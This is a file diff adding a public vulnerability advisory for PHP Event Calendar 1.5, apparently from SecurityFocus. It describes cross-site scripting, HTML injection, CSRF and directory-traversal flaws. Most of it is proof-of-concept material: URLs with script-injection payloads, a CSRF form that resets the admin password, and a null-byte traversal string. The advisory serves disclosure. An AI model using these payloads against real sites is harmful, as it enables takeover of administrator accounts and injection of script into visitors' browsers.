@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/41043/info
+
+SoftComplex PHP Event Calendar is prone to multiple remote security vulnerabilities including cross-site scripting, HTML-injection, directory-traversal, and cross-site request-forgery issues.
+
+Attackers can exploit these issues to obtain sensitive information, upload arbitrary files, execute arbitrary script code, steal cookie-based authentication credentials, and perform certain administrative actions.
+
+PHP Event Calendar 1.5 is vulnerable; other versions may also be affected.
+
+http://www.example.com/[DIR]/cl_files/index.php (POST/Login name)
+http://www.example.com/[DIR]/cl_files/index.php?page=a&name=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/[DIR]/cl_files/index.php?CLd=21&CLm=06&CLy=2010&name=[CALENDAR_NAME]&type=list&action=t&page=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/[DIR]/cl_files/index.php?CLd=21&CLm=06&CLy=2010&name=[CALENDAR_NAME]&type=&action=e&err=&#039;%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3C&#039;
+http://www.example.com/[DIR]/cl_files/index.php?CLd=23&CLm=06&CLy=2010%22%3E%3Cscript%3Ealert(1)%3C/script%3E&name=[CALENDAR_NAME]&type=&action=e
+
+http://www.example.com/[DIR]/cl_files/index.php?page=e
+(Title; Body; Background color; Background image; Align;)
+
+http://www.example.com/[DIR]/cl_files/index.php?page=a
+Change "Admin" Password PoC:
+<form name=user method=post action="http://www.example.com/[DIR]/cl_files/index.php?page=a&name=[CALENDAR_NAME]">
+<input type="hidden" name="page" value="a">
+<input type=hidden value="admin" name=l class=inpt>
+<input type=hidden value="1234" name=p class=inpt>
+<input type=hidden value="1234" name=p2 class=inpt>
+</form>
+
+http://www.example.com/[DIR]/cl_files/index.php
+"Title:" \..\..\..\..\..\..\1.txt%00
